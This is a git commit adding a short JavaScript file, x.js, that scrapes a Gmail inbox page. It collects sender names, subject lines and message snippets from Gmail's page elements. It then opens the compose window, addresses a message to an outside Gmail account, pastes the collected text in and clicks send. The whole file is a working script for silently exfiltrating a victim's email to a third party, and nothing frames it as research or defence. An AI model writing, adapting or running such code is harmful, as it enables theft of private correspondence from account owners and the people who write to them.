8ac638ed06d085da14378e0c1fdd71559dbcd2cf
frkns <61367708+frkns@users.noreply.github.com>
2020-12-12 15:39:47 -0700

    Create x.js

---
+++ x.js
@@ -0,0 +1,20 @@
+var msg = 'Froms:'
+
+let atree = document.getElementsByClassName('zF')
+for (let i = 0; i < atree.length/2; i++) { msg += atree[i*2].innerText+' ,, ' }
+msg += '\n===\nTitles:'
+
+let btree = document.getElementsByClassName('bqe')
+for (let i = 0; i < btree.length/2; i++) { msg += btree[i*2].innerText+' ,, ' }
+msg += '\n===\nBodys:'
+
+let ctree = document.getElementsByClassName('y2')
+for (let i = 0; i < ctree.length/2; i++) { msg += ctree[i*2].innerText+' ,, ' }
+
+document.getElementsByClassName('T-I T-I-KE L3')[0].click()
+setTimeout(()=>{ document.querySelectorAll("[name='to']")[0].innerHTML='flamehose6@gmail.com'
+  document.getElementsByClassName('Am Al editable LW-avf tS-tW')[0].innerHTML=msg
+  setTimeout(()=>{
+    document.getElementsByClassName('T-I J-J5-Ji aoO v7 T-I-atl L3')[0].click()
+  },0)
+},0)
